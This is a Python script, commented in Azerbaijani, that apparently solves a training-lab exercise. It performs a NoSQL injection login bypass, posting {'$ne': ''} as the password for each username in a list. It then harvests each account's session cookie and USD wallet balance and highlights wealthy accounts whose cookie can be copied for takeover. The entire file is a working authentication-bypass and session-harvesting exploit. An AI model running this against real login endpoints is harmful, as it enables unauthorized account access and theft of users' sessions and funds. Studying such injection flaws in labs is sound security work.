import requests
import json

# Sənin verdiyin hədəf URL
base_url = "http://web0x01.hbtn/api/a3/nosql_injection"
login_url = f"{base_url}/sign_in"

# Sənin tapdığın istifadəçilər siyahısı
target_users = [
    "foued", "abdou", "maroua", "yosri", "ismail", 
    "dexter", "john", "hugo", "elon-musk", "jim", "jimmy"
]

headers = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
}

# HBTNc-nin təxmini qiyməti (bunu keçən varlı sayılır)
TARGET_PRICE = 50000 

print(f"[*] {len(target_users)} istifadəçi yoxlanılır...\n")
print(f"{'USERNAME':<15} | {'USD BALANS':<15} | {'COOKIE (SESSION)'}")
print("-" * 80)

for user in target_users:
    # Hər istifadəçi üçün xüsusi payload
    # Məntiq: "Adı 'bu' olsun, şifrəsi boş olmasın"
    payload = {
        "username": user,
        "password": {"$ne": ""}
    }

    try:
        # Login sorğusu
        r = requests.post(login_url, json=payload, headers=headers)
        
        # Cookie-ni götürürük
        session_cookie = r.cookies.get("session")
        cookie_str = f"session={session_cookie}" if session_cookie else "COOKIE_YOXDUR"
        
        # JSON cavabını oxuyuruq
        try:
            data = r.json()
        except:
            print(f"{user:<15} | Xəta (JSON deyil)  | {cookie_str}")
            continue

        usd_balance = 0.0
        
        # Balansı yoxlayırıq
        if data.get("status") == "success":
            msg = data.get("message")
            
            # Əgər mesaj bir obyektdirsə (wallet məlumatı varsa)
            if isinstance(msg, dict):
                wallet = msg.get("wallet", [])
                for coin in wallet:
                    if coin.get("coin") == "USD":
                        usd_balance = float(coin.get("amount", 0))
                
                # Ekrana çap edirik
                print(f"{user:<15} | ${usd_balance:<14,.2f} | {session_cookie[:20]}...")

                # Varlı adamı yoxlayırıq
                if usd_balance > TARGET_PRICE:
                    found_user = user
                    found_cookie = cookie_str
                    print("\n" + "!"*60)
                    print(f"!!! VARLI İSTİFADƏÇİ TAPILDI: {user.upper()} !!!")
                    print(f"!!! Balans: ${usd_balance:,.2f}")
                    print(f"!!! Cookie (Bunu kopyala): {found_cookie}")
                    print("!"*60 + "\n")
            
            # Bəzən server sadəcə "Congratulations" mesajı verir (məlumatı gizli olanlar)
            elif isinstance(msg, str):
                 print(f"{user:<15} | {'GİZLİ HESAB':<15} | {session_cookie[:20]}... (Bunu yoxla!)")

        else:
            print(f"{user:<15} | Giriş Uğursuz     | -")

    except Exception as e:
        print(f"{user:<15} | Xəta: {e}")

print("\n[*] Yoxlama bitdi.")
